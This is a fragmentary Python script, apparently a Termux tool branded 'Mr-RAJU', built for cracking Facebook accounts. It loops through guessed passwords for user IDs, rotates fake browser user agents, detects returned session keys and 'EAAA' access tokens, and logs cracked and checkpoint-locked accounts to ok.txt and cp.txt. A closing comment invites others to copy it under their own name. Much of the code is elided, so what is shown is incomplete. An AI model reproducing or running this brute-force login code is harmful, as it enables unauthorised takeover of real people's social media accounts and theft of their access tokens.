...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m  ツ𝐑𝐒 𝐑𝐀𝐉𝐔ツ \x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-RAJU \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Termux Raju \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook :www.facebook.com/ITZ.ME.OKY.BBY.BYE \x1b[0m\x1b[1;97m]
...
───────────────────────────────────────────────────────× 
    ...
    """)
		...
		subprocess.check_output(["am", "start", "https://youtube.com/channel/UCHo-omO_OVoU0B1109O0Z8g"])
...
'Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36',
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [=ツ𝐑𝐒 𝐑𝐀𝐉𝐔ツ=OK=>] %s | %s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("   [=ツ𝐑𝐒 𝐑𝐀𝐉𝐔ツ=OK=>]  %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r  \033[0;92m   [=ツ𝐑𝐒 𝐑𝐀𝐉𝐔ツ=CP=>] %s | %s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write("   [=ツ𝐑𝐒 𝐑𝐀𝐉𝐔ツ=CP=>]  %s|%s\n"%(uid, pw))
 ...
 #ツ𝐑𝐒 𝐑𝐀𝐉𝐔ツ copy krke apna name dal dyna
